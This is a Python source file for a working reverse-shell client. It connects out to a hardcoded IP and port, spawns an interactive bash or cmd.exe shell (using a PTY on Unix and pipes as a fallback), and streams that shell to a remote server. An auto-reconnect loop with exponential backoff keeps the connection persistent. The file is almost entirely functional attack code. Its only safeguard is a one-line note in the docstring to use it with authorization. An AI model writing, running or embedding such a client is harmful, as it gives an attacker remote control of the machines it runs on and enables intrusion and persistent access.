
#!/usr/bin/env python3
"""
custom_netcat_cli_compat_v2.py

A robust reverse-shell **client** designed to pair with custom_netcat_svr_compat.py.

Highlights
- Cross-platform (Linux/macOS/Windows)
- Unix PTY mode (default ON) for real interactive bash (arrow keys, Ctrl-C)
- Pipe mode fallback (Windows or --no-pty)
- Graceful shutdown when server sends the token ':leave:'
- Auto-reconnect loop with exponential backoff

USAGE
  python3 custom_netcat_cli_compat_v2.py --host 192.168.238.170 --port 4546 [--no-pty] [--shell /bin/sh]

Security
- Use only on systems you own or are authorized to test.
"""
import argparse
import os
import platform
import signal
import socket
import subprocess
import sys
import time
import threading

DEFAULT_HOST = "192.168.238.170"
DEFAULT_PORT = 4546
QUIT_TOKEN = b":leave:"
IS_WINDOWS = platform.system().lower().startswith("win")

# -------------------------
# Utilities
# -------------------------

def safe_close(sock: socket.socket):
    try:
        if sock:
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            sock.close()
    except Exception:
        pass


def kill_proc(proc: subprocess.Popen):
    if proc is None:
        return
    try:
        if IS_WINDOWS:
            try:
                proc.terminate(); proc.wait(timeout=1.5)
            except Exception:
                try: proc.kill()
                except Exception: pass
        else:
            try:
                os.killpg(proc.pid, signal.SIGTERM)
            except Exception:
                try: proc.terminate()
                except Exception: pass
            try:
                proc.wait(timeout=1.5)
            except Exception:
                try: proc.kill()
                except Exception: pass
    except Exception:
        pass


def die(proc=None, sock=None, code=0):
    safe_close(sock)
    kill_proc(proc)
    os._exit(code)


def connect_with_retry(host, port, retry_initial=2, retry_max=15):
    delay = retry_initial
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port))
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception:
                pass
            return s
        except KeyboardInterrupt:
            print("[client] Interrupted while trying to connect")
            try: s.close()
            except Exception: pass
            sys.exit(1)
        except Exception as e:
            print(f"[client] connect failed: {e}; retrying in {delay}s...")
            try: s.close()
            except Exception: pass
            time.sleep(delay)
            delay = min(retry_max, delay * 2)

# -------------------------
# Pipe mode (cross-platform)
# -------------------------

def stream_sender(stream, sock):
    read_chunk = getattr(stream, 'read1', None)
    if not callable(read_chunk):
        def read_chunk(n=4096):
            return stream.read(n)
    try:
        while True:
            data = read_chunk(4096)
            if not data:
                break
            sock.sendall(data)
    except Exception:
        pass


def command_receiver(sock, proc):
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            if QUIT_TOKEN in data:
                break
            proc.stdin.write(data)
            proc.stdin.flush()
    except Exception:
        pass


def run_pipe_session(sock, shell_cmd):
    kwargs = dict(stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=0)
    if not IS_WINDOWS:
        kwargs['preexec_fn'] = os.setsid
    try:
        proc = subprocess.Popen(shell_cmd, **kwargs)
    except FileNotFoundError:
        print(f"[client] Failed to start shell: {shell_cmd}")
        die(None, sock, 1)

    t_out = threading.Thread(target=stream_sender, args=(proc.stdout, sock), daemon=True)
    t_err = threading.Thread(target=stream_sender, args=(proc.stderr, sock), daemon=True)
    t_in  = threading.Thread(target=command_receiver, args=(sock, proc), daemon=True)
    t_out.start(); t_err.start(); t_in.start()

    try:
        while True:
            if proc.poll() is not None:
                break
            time.sleep(0.2)
    except KeyboardInterrupt:
        pass
    finally:
        safe_close(sock)
        kill_proc(proc)

# -------------------------
# PTY mode (Unix only)
# -------------------------

def run_pty_session(sock, shell_cmd):
    import pty, select, termios, fcntl

    master_fd, slave_fd = pty.openpty()

    # put PTY master in raw-ish mode
    try:
        attrs = termios.tcgetattr(master_fd)
        attrs[3] = attrs[3] & ~(termios.ECHO | termios.ICANON)
        termios.tcsetattr(master_fd, termios.TCSANOW, attrs)
    except Exception:
        pass

    kwargs = dict(stdin=slave_fd, stdout=slave_fd, stderr=slave_fd, bufsize=0)
    kwargs['preexec_fn'] = os.setsid

    try:
        proc = subprocess.Popen(shell_cmd, **kwargs)
    except FileNotFoundError:
        os.close(master_fd); os.close(slave_fd)
        print(f"[client] Failed to start shell: {shell_cmd}")
        die(None, sock, 1)

    # Parent does not need slave end
    try: os.close(slave_fd)
    except Exception: pass

    # non-block master
    try:
        flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
        fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
    except Exception:
        pass

    try:
        while True:
            r, _, _ = select.select([sock, master_fd], [], [], 0.3)
            if sock in r:
                try:
                    data = sock.recv(4096)
                except Exception:
                    break
                if not data or QUIT_TOKEN in data:
                    break
                try:
                    os.write(master_fd, data)
                except Exception:
                    break
            if master_fd in r:
                try:
                    data = os.read(master_fd, 4096)
                except BlockingIOError:
                    data = b''
                except Exception:
                    break
                if data:
                    try:
                        sock.sendall(data)
                    except Exception:
                        break
    except KeyboardInterrupt:
        pass
    finally:
        safe_close(sock)
        kill_proc(proc)
        try: os.close(master_fd)
        except Exception: pass

# -------------------------
# Main
# -------------------------

def main():
    parser = argparse.ArgumentParser(description='Reverse shell client compatible with custom_netcat_svr_compat.py')
    parser.add_argument('--host', default=DEFAULT_HOST, help='Server IP/hostname')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Server TCP port')
    default_shell = 'cmd.exe' if IS_WINDOWS else '/bin/bash'
    parser.add_argument('--shell', default=default_shell, help='Shell to spawn on the client')
    parser.add_argument('--no-pty', action='store_true', help='Disable PTY (use pipes); implied on Windows')
    args = parser.parse_args()

    # Build shell cmd according to mode
    shell_cmd = [args.shell]
    if not IS_WINDOWS:
        if args.no_pty:
            # Pipe mode → prefer sh to avoid job control messages
            if os.path.basename(args.shell) == 'bash':
                print('[client] Tip: --no-pty with bash may show job-control warnings; consider --shell /bin/sh')
        else:
            # PTY mode → interactive bash is fine
            if os.path.basename(args.shell) == 'bash':
                shell_cmd = [args.shell, '-i']

    while True:
        sock = connect_with_retry(args.host, args.port)
        print(f"[client] connected to {args.host}:{args.port}")
        try:
            if IS_WINDOWS or args.no_pty:
                run_pipe_session(sock, shell_cmd)
            else:
                run_pty_session(sock, shell_cmd)
        except KeyboardInterrupt:
            die(None, sock, 0)
        except Exception as e:
            print(f"[client] session error: {e}")
        # reconnect after short pause
        time.sleep(2)

if __name__ == '__main__':
    if not IS_WINDOWS:
        signal.signal(signal.SIGINT, signal.SIG_DFL)
    main()
